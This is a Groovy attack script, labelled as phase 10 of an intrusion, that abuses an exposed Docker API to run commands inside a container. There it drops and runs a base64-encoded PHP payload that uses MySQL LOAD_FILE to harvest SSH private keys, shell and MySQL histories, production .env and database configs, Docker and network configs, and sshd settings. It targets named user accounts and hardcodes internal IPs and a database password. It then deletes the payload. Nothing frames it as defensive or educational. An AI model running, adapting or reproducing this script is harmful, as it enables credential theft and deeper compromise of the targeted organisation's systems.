// Phase 10: Read SSH keys, histories, configs from T1Pagos host filesystem
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
$m = new mysqli("172.27.141.4", "adaxxidb", "JTQ6PrkecY3y1kVN", "", 3306);
if ($m->connect_error) { die("FAIL\\n"); }

function loadMysqlFile($m, $path) {
    $r = $m->query("SELECT LOAD_FILE('".$path."') AS c");
    if (!$r) return null;
    $row = $r->fetch_assoc();
    return $row["c"];
}

echo "===== [1] SSH KEYS & HISTORIES =====\\n";
$users = array("root", "eduardo.cruz", "patricio.dorantes", "roman.guevara", "mysql",
               "isnardo.lugardo", "ana.hernandez", "pedro.delacruz", "sergio.garza",
               "braulio.martinez", "tomas.gomez", "carlos.barragan", "rodrigo.montesinos");

foreach ($users as $u) {
    $home = ($u == "root") ? "/root" : "/home/$u";
    $files = array(
        "$home/.ssh/id_rsa",
        "$home/.ssh/id_ed25519",
        "$home/.ssh/authorized_keys",
        "$home/.bash_history",
        "$home/.my.cnf",
        "$home/.mysql_history",
    );
    foreach ($files as $f) {
        $content = loadMysqlFile($m, $f);
        if ($content !== null && strlen($content) > 0) {
            echo "\\n--- FILE_OK: $f (".strlen($content)." bytes) ---\\n";
            if (strlen($content) > 3000) $content = substr($content, 0, 3000)."\\n...[TRUNCATED]";
            echo $content."\\n";
        }
    }
}

echo "\\n===== [2] APP CONFIG FILES (PROD creds) =====\\n";
$app_files = array(
    "/var/www/html/.env",
    "/var/www/html/config/database.php",
    "/var/www/html/app/config.php",
    "/opt/app/.env",
    "/opt/app/config/database.php",
    "/home/apache/app/.env",
    "/home/apache/.env",
    "/etc/sysconfig/iptables",
    "/etc/sysconfig/network",
    "/etc/sysconfig/network-scripts/ifcfg-eth0",
    "/etc/mysql/conf.d/custom.cnf",
    "/etc/my.cnf",
    "/var/lib/mysql/CSDEV01-2.err",
);
foreach ($app_files as $f) {
    $content = loadMysqlFile($m, $f);
    if ($content !== null && strlen($content) > 0) {
        echo "\\n--- FILE_OK: $f (".strlen($content)." bytes) ---\\n";
        if (strlen($content) > 2000) $content = substr($content, 0, 2000)."\\n...[TRUNCATED]";
        echo $content."\\n";
    }
}

echo "\\n===== [3] MYSQL SSH DIR + ERROR LOG =====\\n";
// Check if mysql user has .ssh
$content = loadMysqlFile($m, "/var/lib/mysql/.ssh/authorized_keys");
if ($content) { echo "MYSQL_SSH_EXISTS: $content\\n"; }
else { echo "MYSQL_SSH: not found\\n"; }

// MySQL error log (may contain queries/creds)
$content = loadMysqlFile($m, "/var/lib/mysql/CSDEV01-2.err");
if ($content) {
    // Only last 2000 bytes
    echo "--- MYSQL_ERROR_LOG (last 2000 bytes) ---\\n";
    echo substr($content, -2000)."\\n";
}

echo "\\n===== [4] DOCKER CONFIGS =====\\n";
$docker_files = array(
    "/etc/docker/daemon.json",
    "/home/roman.guevara/docker-compose.yml",
    "/home/roman.guevara/docker-compose.yaml",
    "/opt/docker/docker-compose.yml",
    "/root/docker-compose.yml",
);
foreach ($docker_files as $f) {
    $content = loadMysqlFile($m, $f);
    if ($content) {
        echo "\\n--- $f ---\\n";
        echo (strlen($content) > 2000 ? substr($content,0,2000)."...[TRUNC]" : $content)."\\n";
    }
}

echo "\\n===== [5] NETWORK CONFIG =====\\n";
$net_files = array(
    "/etc/resolv.conf",
    "/etc/sysconfig/iptables",
    "/etc/sysconfig/network",
);
foreach ($net_files as $f) {
    $content = loadMysqlFile($m, $f);
    if ($content) { echo "\\n--- $f ---\\n$content\\n"; }
}

echo "\\n===== [6] SSH CONFIG =====\\n";
$content = loadMysqlFile($m, "/etc/ssh/sshd_config");
if ($content) {
    echo "--- /etc/ssh/sshd_config ---\\n";
    // Filter for interesting lines
    foreach (explode("\\n", $content) as $line) {
        $line = trim($line);
        if ($line && $line[0] != "#" && strlen($line) > 2) {
            echo "  $line\\n";
        }
    }
}

$m->close();
echo "\\nPHASE10_COMPLETE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p10.php && php /tmp/_p10.php 2>&1; rm -f /tmp/_p10.php"

println "########## PHASE 10: FILESYSTEM CRED HARVEST ##########"
println execIn(cmd)
